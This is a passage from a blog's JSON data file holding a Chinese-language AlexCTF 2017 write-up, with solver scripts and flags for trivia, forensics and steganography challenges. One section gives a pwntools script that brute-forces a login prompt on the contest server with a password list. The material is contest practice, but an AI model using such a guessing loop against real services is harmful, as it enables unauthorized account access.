68 85 101 120 132 147 165 180 196 214 231 251 260 275 292 305 325 340 357 371 389 415 420 440 452 473 484 500 4 21 37 63 69 83 100 117 132 147 165 178 196 213 229 244 261 275 293 319 324 340 356 383 388 414 421 436 453 479 485 500 4 24 36 53 69 89 103 125\n\n> Or in hex:\n\n> 04 11 24 3c 44 55 65 78 84 93 a5 b4 c4 d6 e7 fb 104 113 124 131 145 154 165 173 185 19f 1a4 1b8 1c4 1d9 1e4 1f4 04 15 25 3f 45 53 64 75 84 93 a5 b2 c4 d5 e5 f4 105 113 125 13f 144 154 164 17f 184 19e 1a5 1b4 1c5 1df 1e5 1f4 04 18 24 35 45 59 67 7d\n\n> Note that the leading hex character always increments by 1. However, what happens when we look at just the lower 4 bits of each position in hex?\n\n> 414c45584354467b434154535f484944455f534543524554535f444f4e545f544845597d\n\n> That looks like ASCII! It decodes to ALEXCTF{CATS_HIDE_SECRETS_DONT_THEY}.\n\nflag.py\n\n ```\nimport binascii\nfrom PIL import Image\n\nnew = Image.open('cat_with_secrets.png').load()\nold = Image.open('cat_with_secrets_original.jpg').load()\n\nwidth = 512\n\nin_hex = ''\n\nfor y in range(3):\n    for x in range(width):\n        if (y, x) <= (2, 125) and new[x, y] != old[x, y]:\n            in_hex += '%x' % (x % 16)\n\nprint(binascii.unhexlify(in_hex))\n```\n\n当然了简单的方法，`pip install steganography`，然后run`steganography -d cat-with-secrets.png`","slug":"AlexCTF-writeup","published":1,"updated":"2017-02-17T13:01:59.447Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjcpz0jy1000qhv18xyyxpm13","content":"<p>先膜下我们逆向的队友，是真的强，不知道哪位，改天去问问。我就好好学习pwn吧。<br>再吐槽下这个比赛，脑洞奇大= =</p>\n<h2 id=\"Trivia\"><a href=\"#Trivia\" class=\"headerlink\" title=\"Trivia\"></a>Trivia</h2><h3 id=\"TR1-Hello-there\"><a href=\"#TR1-Hello-there\" class=\"headerlink\" title=\"TR1: Hello there\"></a>TR1: Hello there</h3><p>认识了一个叫做IRC(Internet Relay Chat)的在线聊天室，使用方法简单，起一个Nickname，在同一个Chanel里即可。<br>顶部就是Flag</p>\n<p><code>#alexctf: Alexandria University student held capture the flag event ctf.oddcoder.com ALEXCTF{W3_w15h_y0u_g00d_luck}</code></p>\n<h2 id=\"Forensics\"><a href=\"#Forensics\" class=\"headerlink\" title=\"Forensics\"></a>Forensics</h2><h3 id=\"fore1-hit-the-core\"><a href=\"#fore1-hit-the-core\" class=\"headerlink\" title=\"fore1: hit the core\"></a>fore1: hit the core</h3><p><code>strings</code>看一下，发现了一串字符串</p>\n<figure class=\"highlight armasm\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"symbol\">cvqAeqacLtqazEigwiXobxrCrtuiTzahfFreqc</span>&#123;<span class=\"keyword\">bnjrKwgk83kgd43j85ePgb_e_rwqr7fvbmHjklo3tews_hmkogooyf0vbnk0ii87Drfgh_n </span>kiwutfb0ghk9ro987k5tfb_hjiouo087ptfcv&#125;</div></pre></td></tr></table></figure>\n<p>然后大家脑洞清奇的发现了所有的大写字母拼起来就是flag</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\">strings =<span class=\"string\">'''AeqacLtqazEigwiXobxrCrtuiTzahfFreqc&#123;bnjrKwgk83kgd43j85ePgb_e_rwqr7fvbmHjklo3tews_hmkogooyf0vbnk0ii87Drfgh_n kiwutfb0ghk9ro987k5tfb_hjiouo087ptfcv&#125;'''</span></div><div class=\"line\">flag = <span class=\"string\">''</span></div><div class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(len(strings)):</div><div class=\"line\">    <span class=\"keyword\">if</span> i % <span class=\"number\">5</span> == <span class=\"number\">0</span>:</div><div class=\"line\">        flag += strings[i]</div><div class=\"line\"><span class=\"keyword\">print</span> flag</div></pre></td></tr></table></figure>\n<p>flag<code>ALEXCTF{K33P_7H3_g00D_w0rk_up}</code></p>\n<h3 id=\"fore2-mail-client\"><a href=\"#fore2-mail-client\" class=\"headerlink\" title=\"fore2: mail client\"></a>fore2: mail client</h3><p>看了某个答案，是爆破的，当时没想到，但不觉得是一个好方法<br>最终结果是<code>ALEXCTF{Mu77_Th3_CoRe}</code><br>代码：</p>\n<figure class=\"highlight vim\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div></pre></td><td class=\"code\"><pre><div class=\"line\">from pwn import *</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">f</span> = <span class=\"keyword\">open</span>(<span class=\"string\">'string'</span>, <span class=\"string\">'r'</span>)</div><div class=\"line\">lines = <span class=\"keyword\">f</span>.readlines()</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">for</span> i in <span class=\"built_in\">line</span><span class=\"variable\">s:</span></div><div class=\"line\">    <span class=\"keyword\">p</span> = remote(<span class=\"string\">'195.154.53.62'</span>, <span class=\"number\">2222</span>)</div><div class=\"line\">    <span class=\"keyword\">p</span>.recvuntil(<span class=\"string\">'Email:'</span>)</div><div class=\"line\">    <span class=\"keyword\">p</span>.sendline(<span class=\"string\">'alexctf@example.com'</span>)</div><div class=\"line\">    <span class=\"keyword\">p</span>.recvuntil(<span class=\"string\">'Password:'</span>)</div><div class=\"line\">    <span class=\"keyword\">print</span> i</div><div class=\"line\">    <span class=\"keyword\">p</span>.sendline(i)</div><div class=\"line\">    flag = <span class=\"keyword\">p</span>.recvline()</div><div class=\"line\">    <span class=\"keyword\">if</span> <span class=\"string\">'Invalid'</span> in fla<span class=\"variable\">g:</span></div><div class=\"line\">        <span class=\"keyword\">p</span>.<span class=\"keyword\">close</span>()</div><div class=\"line\">        <span class=\"keyword\">continue</span></div><div class=\"line\">    <span class=\"keyword\">else</span>:</div><div class=\"line\">        <span class=\"keyword\">print</span> flag</div><div class=\"line\">        <span class=\"keyword\">p</span>.interactive()</div></pre></td></tr></table></figure>\n<p><code>Password: dksgkpdjg;kdj;gkje;gj;dkgv a enpginewognvln owkge  noejne</code>就是strings了core下</p>\n<h3 id=\"fore3-usb-probing\"><a href=\"#fore3-usb-probing\" class=\"headerlink\" title=\"fore3: usb probing\"></a>fore3: usb probing</h3><p>usb传了一个png，在最大的数据包里能看到，windows有毒，用浏览器打开png才能正常看到</p>\n<p><code>ALEXCTF{SN1FF_T3H_FL4G_OV3R_USB}</code></p>\n<h3 id=\"fore4-unknown-format\"><a href=\"#fore4-unknown-format\" class=\"headerlink\" title=\"fore4: unknown format\"></a>fore4: unknown format</h3><p>里面有一个<code>.SP01</code>文件，上网查一下，是kindle的升级包。网上还有一个<code>kindletool</code>的工具，可以从这种包中打包和提取文件。</p>\n<p><a href=\"https://github.com/NiLuJe/KindleTool\" target=\"_blank\" rel=\"external\">Kindletool</a></p>\n<p>使用过程如下：</p>\n<figure class=\"highlight groovy\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div></pre></td><td class=\"code\"><pre><div class=\"line\">ubuntu<span class=\"meta\">@VM</span><span class=\"number\">-250</span><span class=\"number\">-199</span>-<span class=\"string\">ubuntu:</span><span class=\"regexp\">~/ctf-problem/</span><span class=\"number\">2017</span>alexctf<span class=\"regexp\">/forensics/</span>unknown_format$ ./kindletool dm out flag</div><div class=\"line\">ubuntu<span class=\"meta\">@VM</span><span class=\"number\">-250</span><span class=\"number\">-199</span>-<span class=\"string\">ubuntu:</span><span class=\"regexp\">~/ctf-problem/</span><span class=\"number\">2017</span>alexctf<span class=\"regexp\">/forensics/</span>unknown_format$ file flag</div><div class=\"line\"><span class=\"string\">flag:</span> data</div><div class=\"line\">ubuntu<span class=\"meta\">@VM</span><span class=\"number\">-250</span><span class=\"number\">-199</span>-<span class=\"string\">ubuntu:</span><span class=\"regexp\">~/ctf-problem/</span><span class=\"number\">2017</span>alexctf<span class=\"regexp\">/forensics/</span>unknown_format$ binwalk flag </div><div class=\"line\"></div><div class=\"line\">DECIMAL       HEXADECIMAL     DESCRIPTION</div><div class=\"line\">--------------------------------------------------------------------------------</div><div class=\"line\"><span class=\"number\">254</span>           <span class=\"number\">0xFE</span>            gzip compressed data, from Unix, last <span class=\"string\">modified:</span> <span class=\"number\">2016</span><span class=\"number\">-12</span><span class=\"number\">-31</span> <span class=\"number\">20</span>:<span class=\"number\">20</span>:<span class=\"number\">49</span></div><div class=\"line\"></div><div class=\"line\">ubuntu<span class=\"meta\">@VM</span><span class=\"number\">-250</span><span class=\"number\">-199</span>-<span class=\"string\">ubuntu:</span><span class=\"regexp\">~/ctf-problem/</span><span class=\"number\">2017</span>alexctf<span class=\"regexp\">/forensics/</span>unknown_format$ binwalk -e flag </div><div class=\"line\"></div><div class=\"line\">DECIMAL       HEXADECIMAL     DESCRIPTION</div><div class=\"line\">--------------------------------------------------------------------------------</div><div class=\"line\"><span class=\"number\">254</span>           <span class=\"number\">0xFE</span>            gzip compressed data, from Unix, last <span class=\"string\">modified:</span> <span class=\"number\">2016</span><span class=\"number\">-12</span><span class=\"number\">-31</span> <span class=\"number\">20</span>:<span class=\"number\">20</span>:<span class=\"number\">49</span></div><div class=\"line\"></div><div class=\"line\">ubuntu<span class=\"meta\">@VM</span><span class=\"number\">-250</span><span class=\"number\">-199</span>-<span class=\"string\">ubuntu:</span><span class=\"regexp\">~/ctf-problem/</span><span class=\"number\">2017</span>alexctf<span class=\"regexp\">/forensics/</span>unknown_format$ ls</div><div class=\"line\">flag  _flag.extracted  kindletool  out  usb_sniff.pcap</div><div class=\"line\">ubuntu<span class=\"meta\">@VM</span><span class=\"number\">-250</span><span class=\"number\">-199</span>-<span class=\"string\">ubuntu:</span><span class=\"regexp\">~/ctf-problem/</span><span class=\"number\">2017</span>alexctf<span class=\"regexp\">/forensics/</span>unknown_format$ cd _flag.extracted/ &amp;&amp; ls</div><div class=\"line\">FE  FE.gz</div><div class=\"line\">ubuntu<span class=\"meta\">@VM</span><span class=\"number\">-250</span><span class=\"number\">-199</span>-<span class=\"string\">ubuntu:</span><span class=\"regexp\">~/ctf-problem/</span><span class=\"number\">2017</span>alexctf<span class=\"regexp\">/forensics/</span>unknown_format/_flag.extracted$ tar -zxvf FE.gz</div><div class=\"line\">kindle_out/</div><div class=\"line\">kindle_out/rootfs_md5_list.tar.gz</div><div class=\"line\">kindle_out/<span class=\"number\">2540270001</span><span class=\"number\">-2692310002.</span>ffs</div><div class=\"line\">kindle_out/flag.txt</div><div class=\"line\">kindle_out/update-patches.tar.gz</div><div class=\"line\"><span class=\"symbol\"></span></div><div class=\"line\">gzip: <span class=\"string\">stdin:</span> unexpected end of file</div><div class=\"line\"><span class=\"string\">tar:</span> Unexpected EOF <span class=\"keyword\">in</span> archive</div><div class=\"line\"><span class=\"string\">tar:</span> Unexpected EOF <span class=\"keyword\">in</span> archive</div><div class=\"line\"><span class=\"string\">tar:</span> Error is not <span class=\"string\">recoverable:</span> exiting now</div><div class=\"line\">ubuntu<span class=\"meta\">@VM</span><span class=\"number\">-250</span><span class=\"number\">-199</span>-<span class=\"string\">ubuntu:</span><span class=\"regexp\">~/ctf-problem/</span><span class=\"number\">2017</span>alexctf<span class=\"regexp\">/forensics/</span>unknown_format/_flag.extracted$ ls</div><div class=\"line\">FE  FE.gz  kindle_out</div><div class=\"line\">ubuntu<span class=\"meta\">@VM</span><span class=\"number\">-250</span><span class=\"number\">-199</span>-<span class=\"string\">ubuntu:</span><span class=\"regexp\">~/ctf-problem/</span><span class=\"number\">2017</span>alexctf<span class=\"regexp\">/forensics/</span>unknown_format<span class=\"regexp\">/_flag.extracted$ cd kindle_out/</span></div><div class=\"line\">ubuntu<span class=\"meta\">@VM</span><span class=\"number\">-250</span><span class=\"number\">-199</span>-<span class=\"string\">ubuntu:</span><span class=\"regexp\">~/ctf-problem/</span><span class=\"number\">2017</span>alexctf<span class=\"regexp\">/forensics/</span>unknown_format<span class=\"regexp\">/_flag.extracted/</span>kindle_out$ ls</div><div class=\"line\"><span class=\"number\">2540270001</span><span class=\"number\">-2692310002.</span>ffs  flag.txt  rootfs_md5_list.tar.gz  update-patches.tar.gz</div><div class=\"line\">ubuntu<span class=\"meta\">@VM</span><span class=\"number\">-250</span><span class=\"number\">-199</span>-<span class=\"string\">ubuntu:</span><span class=\"regexp\">~/ctf-problem/</span><span class=\"number\">2017</span>alexctf<span class=\"regexp\">/forensics/</span>unknown_format<span class=\"regexp\">/_flag.extracted/</span>kindle_out$ cat flag.txt </div><div class=\"line\">ALEXCTF&#123;Wh0_N33d5_K1nDl3_t0_3X7R4Ct_K1ND13_F1rMw4R3&#125;</div></pre></td></tr></table></figure>\n<h2 id=\"Scripting\"><a href=\"#Scripting\" class=\"headerlink\" title=\"Scripting\"></a>Scripting</h2><h2 id=\"Script2\"><a href=\"#Script2\" class=\"headerlink\" title=\"Script2\"></a>Script2</h2><p>找到原图。。比较一下，排除噪音，有不同的地方。</p>\n<p><img src=\"/2017/02/07/AlexCTF-writeup/1.png\" alt=\"1.jpg\"></p>\n<p>原图：</p>\n<p><img src=\"/2017/02/07/AlexCTF-writeup/2.png\" alt=\"2.png\"></p>\n<p>下面引用别人的答案：</p>\n<blockquote>\n<p>Some of that is noise. The pixels that look interesting are the 3 rows, where pixels seem to differ at somewhat regular intervals:</p>\n<p>If we print out the x values of these pixels, we get:</p>\n<p>4 17 36 60 68 85 101 120 132 147 165 180 196 214 231 251 260 275 292 305 325 340 357 371 389 415 420 440 452 473 484 500 4 21 37 63 69 83 100 117 132 147 165 178 196 213 229 244 261 275 293 319 324 340 356 383 388 414 421 436 453 479 485 500 4 24 36 53 69 89 103 125</p>\n<p>Or in hex:</p>\n<p>04 11 24 3c 44 55 65 78 84 93 a5 b4 c4 d6 e7 fb 104 113 124 131 145 154 165 173 185 19f 1a4 1b8 1c4 1d9 1e4 1f4 04 15 25 3f 45 53 64 75 84 93 a5 b2 c4 d5 e5 f4 105 113 125 13f 144 154 164 17f 184 19e 1a5 1b4 1c5 1df 1e5 1f4 04 18 24 35 45 59 67 7d</p>\n<p>Note that the leading hex character always increments by 1. However, what happens when we look at just the lower 4 bits of each position in hex?</p>\n<p>414c45584354467b434154535f484944455f534543524554535f444f4e545f544845597d</p>\n<p>That looks like ASCII! It decodes to ALEXCTF{CATS_HIDE_SECRETS_DONT_THEY}.</p>\n</blockquote>\n<p>flag.py</p>\n <figure class=\"highlight livecodeserver\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div></pre></td><td class=\"code\"><pre><div class=\"line\">import binascii</div><div class=\"line\"><span class=\"built_in\">from</span> PIL import Image</div><div class=\"line\"></div><div class=\"line\"><span class=\"built_in\">new</span> = Image.<span class=\"built_in\">open</span>(<span class=\"string\">'cat_with_secrets.png'</span>).<span class=\"built_in\">load</span>()</div><div class=\"line\">old = Image.<span class=\"built_in\">open</span>(<span class=\"string\">'cat_with_secrets_original.jpg'</span>).<span class=\"built_in\">load</span>()</div><div class=\"line\"></div><div class=\"line\">width = <span class=\"number\">512</span></div><div class=\"line\"></div><div class=\"line\">in_hex = <span class=\"string\">''</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">for</span> y <span class=\"keyword\">in</span> range(<span class=\"number\">3</span>):</div><div class=\"line\">    <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> range(width):</div><div class=\"line\">        <span class=\"keyword\">if</span> (y, x) &lt;= (<span class=\"number\">2</span>, <span class=\"number\">125</span>) <span class=\"keyword\">and</span> <span class=\"built_in\">new</span>[x, y] != old[x, y]:</div><div class=\"line\">            in_hex += <span class=\"string\">'%x'</span> % (x % <span class=\"number\">16</span>)</div><div class=\"line\"></div><div class=\"line\">print(binascii.unhexlify(in_hex))</div></pre></td></tr></table></figure>\n<p>当然了简单的方法，<code>pip install steganography</code>，然后run<code>steganography -d cat-with-secrets.png</code></p>\n","excerpt":"","more":"<p>先膜下我们逆向的队友，是真的强，不知道哪位，改天去问问。我就好好学习pwn吧。<br>再吐槽下这个比赛，脑洞奇大= =</p>\n<h2 id=\"Trivia\"><a href=\"#Trivia\" class=\"headerlink\" title=\"Trivia\"></a>Trivia</h2><h3 id=\"TR1-Hello-there\"><a href=\"#TR1-Hello-there\" class=\"headerlink\" title=\"TR1: Hello there\"></a>TR1: Hello there</h3><p>认识了一个叫做IRC(Internet Relay Chat)的在线聊天室，使用方法简单，起一个Nickname，在同一个Chanel里即可。<br>顶部就是Flag</p>\n<p><code>#alexctf: Alexandria University student held capture the flag event ctf.oddcoder.com ALEXCTF{W3_w15h_y0u_g00d_luck}</code></p>\n<h2 id=\"Forensics\"><a href=\"#Forensics\" class=\"headerlink\" title=\"Forensics\"></a>Forensics</h2><h3 id=\"fore1-hit-the-core\"><a href=\"#fore1-hit-the-core\" class=\"headerlink\" title=\"fore1: hit the core\"></a>fore1: hit the core</h3><p><code>strings</code>看一下，发现了一串字符串</p>\n<figure class=\"highlight armasm\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"symbol\">cvqAeqacLtqazEigwiXobxrCrtuiTzahfFreqc</span>&#123;<span class=\"keyword\">bnjrKwgk83kgd43j85ePgb_e_rwqr7fvbmHjklo3tews_hmkogooyf0vbnk0ii87Drfgh_n </span>kiwutfb0ghk9ro987k5tfb_hjiouo087ptfcv&#125;</div></pre></td></tr></table></figure>\n<p>然后大家脑洞清奇的发现了所有的大写字母拼起来就是flag</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\">strings =<span class=\"string\">'''AeqacLtqazEigwiXobxrCrtuiTzahfFreqc&#123;bnjrKwgk83kgd43j85ePgb_e_rwqr7fvbmHjklo3tews_hmkogooyf0vbnk0ii87Drfgh_n kiwutfb0ghk9ro987k5tfb_hjiouo087ptfcv&#125;'''</span></div><div class=\"line\">flag = <span class=\"string\">''</span></div><div class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(len(strings)):</div><div class=\"line\">    <span class=\"keyword\">if</span> i % <span class=\"number\">5</span> == <span class=\"number\">0</span>:</div><div class=\"line\">        flag += strings[i]</div><div class=\"line\"><span class=\"keyword\">print</span> flag</div></pre></td></tr></table></figure>\n<p>flag<code>ALEXCTF{K33P_7H3_g00D_w0rk_up}</code></p>\n<h3 id=\"fore2-mail-client\"><a href=\"#fore2-mail-client\" class=\"headerlink\" title=\"fore2: mail client\"></a>fore2: mail client</h3><p>看了某个答案，是爆破的，当时没想到，但不觉得是一个好方法<br>最终结果是<code>ALEXCTF{Mu77_Th3_CoRe}</code><br>代码：</p>\n<figure class=\"highlight vim\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div></pre></td><td class=\"code\"><pre><div class=\"line\">from pwn import *</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">f</span> = <span class=\"keyword\">open</span>(<span class=\"string\">'string'</span>, <span class=\"string\">'r'</span>)</div><div class=\"line\">lines = <span class=\"keyword\">f</span>.readlines()</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">for</span> i in <span class=\"built_in\">line</span><span class=\"variable\">s:</span></div><div class=\"line\">    <span class=\"keyword\">p</span> = remote(<span class=\"string\">'195.154.53.62'</span>, <span class=\"number\">2222</span>)</div><div class=\"line\">    <span class=\"keyword\">p</span>.recvuntil(<span class=\"string\">'Email:'</span>)</div><div class=\"line\">    <span class=\"keyword\">p</span>.sendline(<span class=\"string\">'alexctf@example.com'</span>)</div><div class=\"line\">    <span class=\"keyword\">p</span>.recvuntil(<span class=\"string\">'Password:'</span>)</div><div class=\"line\">    <span class=\"keyword\">print</span> i</div><div class=\"line\">    <span class=\"keyword\">p</span>.sendline(i)</div><div class=\"line\">    flag = <span class=\"keyword\">p</span>.recvline()</div><div class=\"line\">    <span class=\"keyword\">if</span> <span class=\"string\">'Invalid'</span> in fla<span class=\"variable\">g:</span></div><div class=\"line\">        <span class=\"keyword\">p</span>.<span class=\"keyword\">close</span>()</div><div class=\"line\">        <span class=\"keyword\">continue</span></div><div class=\"line\">    <span class=\"keyword\">else</span>:</div><div class=\"line\">        <span class=\"keyword\">print</span> flag</div><div class=\"line\">        <span class=\"keyword\">p</span>.interactive()</div></pre></td></tr></table></figure>\n<p><code>Password: dksgkpdjg;kdj;gkje;gj;dkgv a enpginewognvln owkge  noejne</code>就是strings了core下</p>\n<h3 id=\"fore3-usb-probing\"><a href=\"#fore3-usb-probing\" class=\"headerlink\" title=\"fore3: usb probing\"></a>fore3: usb probing</h3><p>usb传了一个png，在最大的数据包里能看到，windows有毒，用浏览器打开png才能正常看到</p>\n<p><code>ALEXCTF{SN1FF_T3H_FL4G_OV3R_USB}</code></p>\n<h3 id=\"fore4-unknown-format\"><a href=\"#fore4-unknown-format\" class=\"headerlink\" title=\"fore4: unknown format\"></a>fore4: unknown format</h3><p>里面有一个<code>.SP01</code>文件，上网查一下，是kindle的升级包。网上还有一个<code>kindletool</code>的工具，可以从这种包中打包和提取文件。</p>\n<p><a href=\"https://github.com/NiLuJe/KindleTool\">Kindletool</a></p>\n<p>使用过程如下：</p>\n<figure class=\"highlight groovy\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div></pre></td><td class=\"code\"><pre><div class=\"line\">ubuntu<span class=\"meta\">@VM</span><span class=\"number\">-250</span><span class=\"number\">-199</span>-<span class=\"string\">ubuntu:</span><span class=\"regexp\">~/ctf-problem/</span><span class=\"number\">2017</span>alexctf<span class=\"regexp\">/forensics/</span>unknown_format$ ./kindletool dm out flag</div><div class=\"line\">ubuntu<span class=\"meta\">@VM</span><span class=\"number\">-250</span><span class=\"number\">-199</span>-<span class=\"string\">ubuntu:</span><span class=\"regexp\">~/ctf-problem/</span><span class=\"number\">2017</span>alexctf<span class=\"regexp\">/forensics/</span>unknown_format$ file flag</div><div class=\"line\"><span class=\"string\">flag:</span> data</div><div class=\"line\">ubuntu<span class=\"meta\">@VM</span><span class=\"number\">-250</span><span class=\"number\">-199</span>-<span class=\"string\">ubuntu:</span><span class=\"regexp\">~/ctf-problem/</span><span class=\"number\">2017</span>alexctf<span class=\"regexp\">/forensics/</span>unknown_format$ binwalk flag </div><div class=\"line\"></div><div class=\"line\">DECIMAL       HEXADECIMAL     DESCRIPTION</div><div class=\"line\">--------------------------------------------------------------------------------</div><div class=\"line\"><span class=\"number\">254</span>           <span class=\"number\">0xFE</span>            gzip compressed data, from Unix, last <span class=\"string\">modified:</span> <span class=\"number\">2016</span><span class=\"number\">-12</span><span class=\"number\">-31</span> <span class=\"number\">20</span>:<span class=\"number\">20</span>:<span class=\"number\">49</span></div><div class=\"line\"></div><div class=\"line\">ubuntu<span class=\"meta\">@VM</span><span class=\"number\">-250</span><span class=\"number\">-199</span>-<span class=\"string\">ubuntu:</span><span class=\"regexp\">~/ctf-problem/</span><span class=\"number\">2017</span>alexctf<span class=\"regexp\">/forensics/</span>unknown_format$ binwalk -e flag </div><div class=\"line\"></div><div class=\"line\">DECIMAL       HEXADECIMAL     DESCRIPTION</div><div class=\"line\">--------------------------------------------------------------------------------</div><div class=\"line\"><span class=\"number\">254</span>           <span class=\"number\">0xFE</span>            gzip compressed data, from Unix, last <span class=\"string\">modified:</span> <span class=\"number\">2016</span><span class=\"number\">-12</span><span class=\"number\">-31</span> <span class=\"number\">20</span>:<span class=\"number\">20</span>:<span class=\"number\">49</span></div><div class=\"line\"></div><div class=\"line\">ubuntu<span class=\"meta\">@VM</span><span class=\"number\">-250</span><span class=\"number\">-199</span>-<span class=\"string\">ubuntu:</span><span class=\"regexp\">~/ctf-problem/</span><span class=\"number\">2017</span>alexctf<span class=\"regexp\">/forensics/</span>unknown_format$ ls</div><div class=\"line\">flag  _flag.extracted  kindletool  out  usb_sniff.pcap</div><div class=\"line\">ubuntu<span class=\"meta\">@VM</span><span class=\"number\">-250</span><span class=\"number\">-199</span>-<span class=\"string\">ubuntu:</span><span class=\"regexp\">~/ctf-problem/</span><span class=\"number\">2017</span>alexctf<span class=\"regexp\">/forensics/</span>unknown_format$ cd _flag.extracted/ &amp;&amp; ls</div><div class=\"line\">FE  FE.gz</div><div class=\"line\">ubuntu<span class=\"meta\">@VM</span><span class=\"number\">-250</span><span class=\"number\">-199</span>-<span class=\"string\">ubuntu:</span><span class=\"regexp\">~/ctf-problem/</span><span class=\"number\">2017</span>alexctf<span class=\"regexp\">/forensics/</span>unknown_format/_flag.extracted$ tar -zxvf FE.gz</div><div class=\"line\">kindle_out/</div><div class=\"line\">kindle_out/rootfs_md5_list.tar.gz</div><div class=\"line\">kindle_out/<span class=\"number\">2540270001</span><span class=\"number\">-2692310002.</span>ffs</div><div class=\"line\">kindle_out/flag.txt</div><div class=\"line\">kindle_out/update-patches.tar.gz</div><div class=\"line\"><span class=\"symbol\"></span></div><div class=\"line\">gzip: <span class=\"string\">stdin:</span> unexpected end of file</div><div class=\"line\"><span class=\"string\">tar:</span> Unexpected EOF <span class=\"keyword\">in</span> archive</div><div class=\"line\"><span class=\"string\">tar:</span> Unexpected EOF <span class=\"keyword\">in</span> archive</div><div class=\"line\"><span class=\"string\">tar:</span> Error is not <span class=\"string\">recoverable:</span> exiting now</div><div class=\"line\">ubuntu<span class=\"meta\">@VM</span><span class=\"number\">-250</span><span class=\"number\">-199</span>-<span class=\"string\">ubuntu:</span><span class=\"regexp\">~/ctf-problem/</span><span class=\"number\">2017</span>alexctf<span class=\"regexp\">/forensics/</span>unknown_format/_flag.extracted$ ls</div><div class=\"line\">FE  FE.gz  kindle_out</div><div class=\"line\">ubuntu<span class=\"meta\">@VM</span><span class=\"number\">-250</span><span class=\"number\">-199</span>-<span class=\"string\">ubuntu:</span><span class=\"regexp\">~/ctf-problem/</span><span class=\"number\">2017</span>alexctf<span class=\"regexp\">/forensics/</span>unknown_format<span class=\"regexp\">/_flag.extracted$ cd kindle_out/</span></div><div class=\"line\">ubuntu<span class=\"meta\">@VM</span><span class=\"number\">-250</span><span class=\"number\">-199</span>-<span class=\"string\">ubuntu:</span><span class=\"regexp\">~/ctf-problem/</span><span class=\"number\">2017</span>alexctf<span class=\"regexp\">/forensics/</span>unknown_format<span class=\"regexp\">/_flag.extracted/</span>kindle_out$ ls</div><div class=\"line\"><span class=\"number\">2540270001</span><span class=\"number\">-2692310002.</span>ffs  flag.txt  rootfs_md5_list.tar.gz  update-patches.tar.gz</div><div class=\"line\">ubuntu<span class=\"meta\">@VM</span><span class=\"number\">-250</span><span 